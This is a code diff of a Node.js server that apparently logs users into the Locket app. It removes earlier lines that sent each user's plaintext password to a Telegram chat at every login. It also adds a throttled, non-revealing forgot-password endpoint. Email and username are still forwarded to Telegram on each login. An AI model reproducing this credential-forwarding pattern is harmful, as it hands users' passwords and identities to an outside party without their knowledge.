@@ -202,7 +202,7 @@ app.use('/api',checkOrigin);
 
 
 
-async function notifyTelegramLogin(email, username, password) {
+async function notifyTelegramLogin(email, username) {
   const botToken = String(process.env.TELEGRAM_BOT_TOKEN || '').trim().replace(/^bot/i, '');
   const chatId = String(process.env.TELEGRAM_CHAT_ID || '').trim();
   if (!botToken || !chatId) {
@@ -213,7 +213,6 @@ async function notifyTelegramLogin(email, username, password) {
     'Đăng nhập Locket thành công',
     'Email: ' + (email || '(không có)'),
     'Username: ' + (username || '(không lấy được)'),
-    'Mật khẩu: ' + (password || '(không có)'),
     'Thời gian: ' + new Date().toLocaleString('vi-VN', {timeZone:'Asia/Ho_Chi_Minh'})
   ].join('\n');
   const response = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
@@ -227,6 +226,46 @@ async function notifyTelegramLogin(email, username, password) {
     console.error('[Telegram]', response.status, result.description || 'Gửi thông báo thất bại');
   }
 }
+// Yêu cầu email đặt lại mật khẩu qua Firebase Auth của Locket.
+// Không lưu mật khẩu và không tiết lộ email nào tồn tại.
+app.post('/api/forgot-password', wrap(async (req,res) => {
+  const email=String(req.body?.email||'').trim().toLowerCase();
+  if(email.length>320||!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
+    return res.status(400).json({error:'Nhập địa chỉ email hợp lệ.'});
+  if(!configured()) return res.status(503).json({error:'Dịch vụ tạm thời chưa sẵn sàng.'});
+
+  // Throttle toàn cục theo IP và email băm; không ghi địa chỉ email vào Redis.
+  const ip=String(req.headers['x-forwarded-for']||req.ip||'unknown').split(',')[0].trim();
+  const ipKey='locket:reset:ip:'+crypto.createHash('sha256').update(ip).digest('hex');
+  const emailKey='locket:reset:email:'+crypto.createHash('sha256').update(email).digest('hex');
+  const generic='Nếu email có tài khoản Locket và được hỗ trợ, bạn sẽ nhận được hướng dẫn đặt lại mật khẩu. Hãy kiểm tra cả thư rác.';
+  const count=Number(await redis('INCR',ipKey));
+  if(count===1)await redis('EXPIRE',ipKey,3600);
+  if(count>5)return res.status(429).json({error:'Bạn đã thử quá nhiều lần. Vui lòng thử lại sau.'});
+  const allowed=await redis('SET',emailKey,'1','EX',900,'NX');
+  if(allowed!=='OK')return res.json({ok:true,message:generic});
+
+  const resetUrl='https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key='+
+    encodeURIComponent(res.locals.resetKey||require('locket.js/lib/session').SessionManager.FIREBASE_API_KEY);
+  try {
+    const response=await fetch(resetUrl,{
+      method:'POST',
+      headers:{'Content-Type':'application/json','X-Firebase-Locale':'vi'},
+      body:JSON.stringify({requestType:'PASSWORD_RESET',email}),
+      signal:AbortSignal.timeout(10000)
+    });
+    if(!response.ok){
+      // Không tiết lộ email có đăng ký Locket hay không.
+      const result=await response.json().catch(()=>({}));
+      const code=String(result?.error?.message||'UNKNOWN');
+      console.warn('[Password reset] Firebase rejected:',code.replace(/[A-Za-z0-9_-]{32,}/g,'[redacted]'));
+    }
+  }catch(err){
+    console.warn('[Password reset] Firebase unavailable:',err.message);
+  }
+  res.json({ok:true,message:generic});
+}));
+
 app.post('/api/login',wrap(async(req,res)=>{
   const {email,password}=req.body||{};
   if(typeof email!=='string'||typeof password!=='string'||
@@ -247,7 +286,7 @@ app.post('/api/login',wrap(async(req,res)=>{
     } catch (err) {
       console.warn('[Telegram] Không lấy được username:', err.message);
     }
-    await notifyTelegramLogin(email.trim(), username, password);
+    await notifyTelegramLogin(email.trim(), username);
   } catch (err) {
     console.error('[Telegram] Gửi thất bại:', err.message);
   }
